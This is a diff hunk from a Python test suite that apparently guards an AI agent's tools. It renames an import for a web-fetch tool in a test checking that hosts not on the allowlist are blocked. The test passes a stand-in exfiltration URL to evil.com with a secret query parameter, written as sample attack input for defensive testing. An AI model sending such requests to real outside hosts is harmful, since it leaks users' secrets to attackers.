@@ -745,7 +745,7 @@ def test_agent_loop_denies_out_of_workspace_write(tmp_path) -> None:  # noqa: AN
 
 
 def test_web_fetch_blocks_non_allowlisted_hosts() -> None:
-    from ticker_dossier.tools.web_tools import web_fetch_tool
+    from ticker_dossier.tools.web import web_fetch_tool
 
     try:
         web_fetch_tool.run(url="https://evil.com/collect?secret=x")
